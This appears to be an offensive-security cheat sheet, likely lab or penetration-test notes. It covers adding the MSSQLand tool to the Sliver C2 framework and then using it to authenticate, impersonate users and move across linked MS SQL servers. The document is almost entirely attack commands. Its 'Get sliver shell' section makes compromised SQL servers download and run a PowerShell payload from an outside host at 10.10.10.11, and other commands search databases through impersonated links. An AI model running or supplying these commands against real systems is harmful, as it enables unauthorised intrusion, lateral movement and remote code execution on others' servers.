# MSSQLand

Link: https://github.com/n3rada/MSSQLand

## Add Custom Command

### 1) Locate aliases directory

    /home/kali/.sliver-client/aliases

### 2) Create new folder mssqland

    mkdir mssqland

### 3) Create alias.json with contents:

    {
        "name": "MSSQLand",
        "version": "v1.0",
        "command_name": "mssqland",
        "original_author": "n3rada",
        "repo_url": "https://github.com/n3rada/MSSQLand",
        "help": "Effortlessly navigate and conquer linked Microsoft SQL Server (MS SQL) servers",
        "entrypoint": "Main",
        "allow_args": true,
        "default_args": "/help",
        "is_reflective": false,
        "is_assembly": true,
        "files": [
          {
            "os": "windows",
            "arch": "amd64",
            "path": "MSSQLand.exe"
          },
          {
            "os": "windows",
            "arch": "386",
            "path": "MSSQLand.exe"
          }
        ]
    }

### 4) Paste compiled MSSQLand.exe

In project directory, run

    dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true -o out

### 5) Restart Sliver

## Usage

### 1) Local Authentication on different SQL servers

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /action:whoami
    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql02 /action:whoami
    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql03 /action:whoami


### 2) Token authentication (current user)

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql04 /a:whoami
    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:localhost /a:whoami


### 3) Check what user can be impersonated on current instance

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01 /a:impersonate


### 4) List down the chained links

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /action:linkmap


### 5) Linkmap to check links (really useful)

    SQL01 (localuser [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])
    SQL01 (localuser [dbo]) ---> SQL03 (localAccount [dbo]) ---> SQL02 (localGroup [dbo]) ---> SQL03 (localapps [guest])


### 6) Impersonate user across link

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /l:sql02 /action:whoami
    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:sql02 /action:whoami
    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:sql03 /action:whoami
    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01 /a:whoami


### 7) Impersonating users across link - sql01 -> sql03 -> sql02

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:SQL03:localAccount,SQL02:localGroup /action:whoami


### 8) Get sliver shell

    execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:webapp11 /l:sql27 /action:pwshdl '10.10.10.11/hav0c-ps.txt'
    execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:webapp11 /l:sql53 /action:pwshdl '10.10.10.11/hav0c-ps.txt'
    execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01 /a:pwshdl "10.10.10.11/hav0c-ps.txt"
    execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:pwshdl "10.10.10.11/hav0c-ps.txt"


### 9) Search Databases (within link)

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:databases


### 10) Search strings in databases (with spaces, for each string)

    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:search wordpress
    execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:search wordpress admin
